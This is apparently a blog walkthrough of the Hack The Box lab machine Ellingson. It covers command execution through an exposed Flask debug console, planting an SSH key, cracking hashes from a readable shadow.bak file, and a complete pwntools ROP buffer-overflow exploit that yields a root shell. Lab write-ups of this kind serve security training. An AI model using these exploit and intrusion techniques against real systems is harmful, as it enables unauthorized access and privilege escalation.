---
title: "HTB Ellingson Walkthrough"
date: "2025-04-24"

layout: ../../layouts/PostLayout.astro
description: "Detail walkthrough on hackthebox machine ellingson."

img_path : "/images/ellingson/theme.png"
img_alt: "web image"
---

## Title: Ellingson

## About Ellingson

Ellingson is a hard difficulty Linux box running a python flask server in debug mode, behind a nginx proxy. The debugger can be abused to execute code on the server in the context of the user running it. The user is found to be in the adm group which has access to the shadow.bak file, from which hashes can be gained and cracked, which allows for lateral movement. A SUID binary is found to be vulnerable to a buffer overflow - but as ASLR and NX are enabled - a ROP based exploitation needs to be performed to gain a root shell. 

## 1. The Process

### Enumeration

Let’s run nmap

![image.png](/images/ellingson/image1.png)

There are 2 ports open, ssh on port 22 version Ubuntu and HTTP on port 80 version nginx 1.14.0(Ubuntu).

Let’s check the HTTP port.

![image.png](/images/ellingson/image2.png)

It is a company website running on an Nginx server. The URL is /index, which is supposed to be /index.html. That means there could be some alias or reverse proxy in play.

There are some interesting articles, let’s check those articles

![image.png](/images/ellingson/image3.png)

Their system was once penetrated using a superuser account. The page is using the path /articles/:id to index the articles. 

Let’s try injecting into the url.

![image.png](/images/ellingson/image4.png)

There are only 3 articles on that website, so when I enter id as 4, it says “list index out of range”.

But instead of 404 Not Found, we receive a response from the Flask server. This confirms that the nginx server is acting as a reverse proxy, redirecting requests to a Flask server.

At the end of the page, some info mentions “For code execution mouse over the frame you want to debug and click on the console icon on the right side.”

![image.png](/images/ellingson/image5.png)

It provides a Python console which can be used to debug code. We can directly execute python code on this console.

### Exploitation

Now that we can execute code, we need to find a way to execute commands on the box. As this
is a debugger, we can’t directly use the system() function to get output. In this case, we can use
the subprocess.check_output() function to execute code and save it to a variable.

```python
import subprocess
output = subprocess.check_output('whoami', shell=True )
print(output.decode('utf-8'))
```

This will execute a system command whoami.

![image.png](/images/ellingson/image6.png)

We got the output as hal. In the company website the team members are posted.

![image.png](/images/ellingson/image7.png)

Yes, hal is a valid user.

Let’s check his home directory.

```python
import subprocess
output = subprocess.check_output('ls -al /home/hal', shell=True)
print(output.decode('utf-8'))
```

![image.png](/images/ellingson/image8.png)

There is a .ssh folder, let’s write our public key to the authorized_keys file so that we can login.

First get your own public key for ssh.

```bash
cat ~/.ssh/id_rsa.pub
```

Then paste your public key and run the command in that python console.

```python
import subprocess
proc = subprocess.check_output('echo "your_ssh_publickey" > /home/hal/.ssh/authorized_keys', shell=True );
```

![image.png](/images/ellingson/image9.png)

Now let’s login to hal via ssh.

![image.png](/images/ellingson/image10.png)

Boom.. we are now user hal. 

Let’s check his account

![image.png](/images/ellingson/image11.png)

There is nothing in hal. And there are three other users, but I don’t have permission.

When I check the group of the user hal, I found that hal is in the adm group.

Let’s check all the files readable by this group.

![image.png](/images/ellingson/image12.png)

Among all files, shadow.bak is the suspicious one. So I asked ChatGPT about it.

![image.png](/images/ellingson/image13.png)

Let’s look at this file.

![image.png](/images/ellingson/image14.png)

Oh, there is a hashed passwords for all user accounts. Let’s copy the file locally to try and crack the hashes.

I copied the hashes and pasted them in the file name hash.txt. And I cracked the hash using John the Ripper.

Using a rockyou.txt took so much time. Let’s create a subset wordlist using the words Love, Secret, Sex, and God from rockyou. I am using these words because it is given on the website that those words are commonly used in their password.

```bash
grep -iE 'love|sex|secret|god' /home/tshering/THM/rockyou.txt > wordlist 
```

Now let’s crack the hash again. This time using the subset wordlist that I have created.

![image.png](/images/ellingson/image15.png)

Password for the user margo was cracked first.  It is iamgod$08

let’s login to user margo via ssh.

![image.png](/images/ellingson/image16.png)

Boom..we got the shell for margo.

### User Flag

margo has a user flag

![image.png](/images/ellingson/image17.png)

### PRIVILEGE ESCALATION

Using margo’s shell, let’s find the way to get into the root shell.

First let’s look at the suid files.

![image.png](/images/ellingson/image18.png)

 Among all the files, the file binary /usr/bin/garbage isn’t a standard binary. Let’s see what it does.

![image.png](/images/ellingson/image19.png)

It asks for the access password. But the password for margo isn’t working.

Let’s use ltrace to track the library calls.

![image.png](/images/ellingson/image20.png)

The password that I entered is compared with “N3veRF3@r1iSh3r3!”.

Let’s use this as our password.

![image.png](/images/ellingson/image21.png)

It gives four options that don’t seem to be of much use and don’t take any input.

Let’s transfer it over using scp to analyze the binary.

```bash
scp hal@10.10.10.139:/usr/bin/garbage .
```

Now I am going to write a Python code to exploit the login.

```python
#!/usr/bin/python
from pwn import *

s = ssh(host = "10.10.10.139", user = "margo", password = "iamgod$08")
context(os = "linux", arch = "amd64")
p = s.process("/usr/bin/garbage")
buf_size = 136
puts_plt = 0x401050
puts_got = 0x404028
pop_rdi = 0x40179b
main_addr = 0x401619

buf = b'A' * buf_size
buf += p64(pop_rdi)
buf += p64(puts_got)
buf += p64(puts_plt)
buf += p64(main_addr)

p.sendline(buf)
p.recvuntil("access denied.")
leaked_puts = p.recv()[:8].strip().ljust(8, b'\x00')
log.info("Leaked address: {}".format(leaked_puts.hex()))

puts_glibc = 0x809c0
offset = u64(leaked_puts) - puts_glibc
system_glibc = 0x4f440
setuid_glibc = 0xe5970
sh = 0x1b3e9a

system = p64(offset + system_glibc)
shell = p64(offset + sh)
setuid = p64(offset + setuid_glibc)

buf = b'A' * buf_size
buf += p64(pop_rdi) + p64(0) + setuid
buf += p64(pop_rdi) + shell + system

p.sendline(buf)
p.interactive()
```

We should find those values from garbage.

**Working of my code**

The exploit starts by establishing an SSH connection to the target machine (`10.10.10.139`) using the provided credentials (`margo` and `iamgod$08`). It then prepares a payload for a buffer overflow on the vulnerable program (`/usr/bin/garbage`). The buffer size is determined to be 136 bytes, and a ROP (Return-Oriented Programming) chain is crafted. The first part of the payload overflows the buffer, executing a call to `puts` in the Procedure Linkage Table (PLT), which leaks the address of `puts` from the Global Offset Table (GOT). The leaked address is received, and the script calculates the base address of libc by subtracting the known offset of `puts` in libc. Using this base, the script calculates the addresses of important functions like `system` and `setuid`, as well as the address of the `/bin/sh` string. A second payload is crafted, this time to call `setuid(0)` to grant root privileges, followed by `system("/bin/sh")` to spawn a shell. The exploit then sends the final payload to the target and enters interactive mode to control the shell. 

![image.png](/images/ellingson/image22.png)

Finally, I got the root shell.

### Root Flag

![image.png](/images/ellingson/image23.png)

## 2. Learning

- Flask  is a micro-web-framework based on python. Micro-framework is normally a
framework with little to no external dependencies on libraries.
- The `subprocess.check_output()` function in Python is used to run a command in the shell or system, and capture (return) its output as a byte string.
- I have learned that we can add our ssh public to victim machine and login to there machine using ssh.
- I learned about the shadow.bak file.
- —fork=4 it can work 4x ****faster (in ideal conditions).
- ltrace is a trace (log) library calls made by a program.

## 3. Reference List

[Ellingson.pdf](/images/ellingson/Ellingson.pdf)